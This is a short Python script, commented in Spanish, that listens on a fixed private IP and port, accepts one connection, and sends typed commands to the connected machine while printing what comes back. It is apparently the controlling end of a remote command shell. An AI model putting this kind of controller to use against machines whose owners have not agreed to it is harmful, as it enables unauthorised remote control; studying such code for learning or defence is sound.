import socket
import sys


class Server(object):
    def __init__(self, ip, port):
        try:
            #Montar servidor socket en una ip y puerto, y estar a la eschucha de peticiones.
            self.server = socket.socket()
            self.server.bind((ip, int(port)))
            self.server.listen(1)

            self.user, self.addr = self.server.accept()
            while True:
                cmd = input('Command: ')
                if cmd.lower() == 'exit':
                    break
                self.user.send(cmd.encode('UTF-8'))
                output = self.user.recv(8192).decode('UTF-8')
                print("Output:", output)

        except Exception as e:
            print(e)


#Introducir IP servidor como argumento a la hora de ejecutar el script o como input si no se ha introducido anteriormente
# if len(sys.argv) == 1:
#     ip, port = input('Ip servidor: '), input('Puerto: ')
# else:
#     ip, port = sys.argv[1], sys.argv[2]

ip = '192.168.0.104'
port = 8888

server = Server(ip, port)
